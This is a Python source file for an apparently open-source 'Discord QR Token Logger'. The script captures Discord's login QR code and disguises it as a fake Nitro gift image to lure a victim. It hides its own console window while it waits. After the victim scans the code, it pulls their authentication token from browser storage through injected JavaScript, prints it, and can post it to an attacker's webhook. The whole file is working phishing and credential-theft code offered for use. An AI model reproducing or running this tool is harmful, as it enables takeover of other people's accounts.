"""
Discord QR Token Logger
-----------------------
Generates a Discord Nitro bait image with a QR code that will prompt a user to login.
If the user logs in, their authentication token will be displayed to the console.
Optionally, the user's authentication token may also be sent to a Discord channel via a webhook.
LICENSE: GNU GENERAL PUBLIC LICENSE Version 3, 29 June 2007
CREDITS
Lemon.-_-.#3714
Luci (9P9)
the-cult-of-integral
mte0
"""

import base64
import ctypes
import os
import time
from io import BytesIO
from logging import ERROR
from tempfile import NamedTemporaryFile, TemporaryDirectory
from threading import Thread

from bs4 import BeautifulSoup
from PIL import Image
from pystray import Icon, Menu, MenuItem
from pystyle import Box, Center, Colorate, Colors, System, Write
from selenium import webdriver
from selenium.common.exceptions import WebDriverException
from selenium.webdriver.chrome.service import Service

from constants import BANNER, NO, PYSTRAY_IMG, YES
from discord_token import QRGrabber, TokenInfo
from exceptions import InvalidToken, QRCodeNotFound, WebhookSendFailure
from logger import log_unknown_exceptions


@log_unknown_exceptions(ERROR)
def main(webhook_url: str) -> None:
    """The main function of the program.
    \nProgram by Lemon.-_-.#3714, Luci (9P9), the-cult-of-integral and mte0
    """    
    Write.Print('\n\n[!] Generating QR code...', Colors.red_to_purple)
    opts = webdriver.ChromeOptions()
    opts.add_argument('--headless')
    opts.add_experimental_option('detach', True)
    opts.add_experimental_option('excludeSwitches', ['enable-logging'])
    opts.add_argument('--log-level 3')

    # This module conflicts with PyStyle; importing here prevents this issue.
    from webdriver_manager.chrome import ChromeDriverManager

    os.environ['WDM_LOG_LEVEL'] = '0'

    try:
        main.driver = webdriver.Chrome(
            service=Service(ChromeDriverManager().install()), 
            options=opts)
    except WebDriverException:
        raise SystemExit('WebDriverException : have you tried installing the latest version of Google Chrome?')

    main.driver.implicitly_wait(5)
    main.driver.get('https://discord.com/login')

    time.sleep(5)  # Attempted to do this with WebDriverWait but it resulted in a
                    # number of issues.

    source = BeautifulSoup(main.driver.page_source, features='lxml')


    qrg = QRGrabber('resources')

    try:
        qr_code = qrg.get_qr_from_source(source)
    except QRCodeNotFound as e:
        main.driver.quit()
        raise SystemExit(e)

    discord_login = main.driver.current_url

    with TemporaryDirectory(dir='.') as td:
        with NamedTemporaryFile(dir=td, suffix='.png') as tp1:
            tp1.write(base64.b64decode(qr_code.replace('data:image/png;base64,', '')))
            Write.Print('\n[!] Generating template for QR code...', Colors.red_to_purple)
            with NamedTemporaryFile(dir=td, suffix='.png') as tp2:
                qrg.generate_qr_for_template(tp1, tp2)
                Write.Print('\n[!] Generating Discord Nitro template for QR code...', 
                            Colors.red_to_purple)
                qrg.generate_nitro_template(tp2)

    Write.Print('\n[#] Waiting for target to login using the QR code...', Colors.red_to_purple)
    pystray_icon.icon.notify("This script has been set to hide until the target's token is grabbed.", 
                             'Waiting for target')
    time.sleep(3)
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

    while True:
        if discord_login != main.driver.current_url:
            try:
                os.remove('discord_gift.png')
            except:
                pass
            token = main.driver.execute_script('''
                window.dispatchEvent(new Event('beforeunload'));
                let iframe = document.createElement('iframe');
                iframe.style.display = 'none';
                document.body.appendChild(iframe);
                let localStorage = iframe.contentWindow.localStorage;
                var token = JSON.parse(localStorage.token);
                return token;
                ''')
            break

    main.driver.quit()
    pystray_icon.icon.notify("The target scanned the QR-code sucessfuly.", 'New Victim !')
    time.sleep(3)
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 5)

    try:
        token_info = TokenInfo(token)
        del token
        Write.Print(f"\n\n[?] The following token has been grabbed: {token_info.token}", Colors.rainbow)

        if webhook_url is not None:
            try:
                token_info.send_info_to_webhook(webhook_url)
            except WebhookSendFailure as e:
                Write.Print(f"[!] {e}", Colors.red)

        Write.Input('\n\n[*] Press ENTER to quit.', Colors.blue_to_green)

    except InvalidToken:
        Write.Print('\n\n[!] An invalid token has been accessed.', Colors.red)


if __name__ == "__main__":

    @log_unknown_exceptions(ERROR)
    def pystray_icon():
        def window_state(_, item):
            if str(item) == 'Show':
                return ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 5)
            elif str(item) == 'Hide':
                return ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
            elif str(item) == 'Quit':
                pystray_icon.icon.stop()
                main.driver.quit()
                raise SystemExit

        pystray_icon.icon = Icon('QR_DTG', Image.open(BytesIO(base64.b64decode(PYSTRAY_IMG))), menu=Menu(
            MenuItem('Show', window_state),
            MenuItem('Hide', window_state),
            MenuItem('Quit', window_state)
        ))
        pystray_icon.icon.run()

    System.Title('QR DISCORD LOGIN - By Lemon.-_-.#3714, Luci (9P9), the-cult-of-integral and mte0')
    System.Size(140, 35)

    print(Colorate.Horizontal(Colors.cyan_to_green, Center.XCenter(BANNER), 1))
    print(Colorate.Horizontal(Colors.rainbow, Center.GroupAlign(Box.DoubleCube("By Lemon.-_-.#3714, Luci (9P9), the-cult-of-integral and mte0")), 1))
    print(Colorate.Horizontal(Colors.rainbow, Box.Lines("https://github.com/9P9/Discord-QR-Token-Logger").replace('ቐ', "$"), 1), "\n")

    confir = Write.Input("[*] Do you want to use a Discord Webhook URL ? [y/n] -> ", Colors.green_to_cyan, interval=0.01)
    if (confir == YES) or (confir == YES.upper()):
        th_main = Thread(target=main, args=(Write.Input("\n[*] Enter your webhook url -> ", Colors.green_to_cyan, interval=0.01),))
    elif (confir == NO) or (confir == NO.upper()):
        th_main = Thread(target=main, args=(None,))
    else:
        raise SystemExit('Failed to recognise an input of either \'y\' or \'n\'.')

    Thread(target=pystray_icon).start()
    th_main.start()

    while True:
        if not th_main.is_alive():
            pystray_icon.icon.stop()
            break
        time.sleep(3)
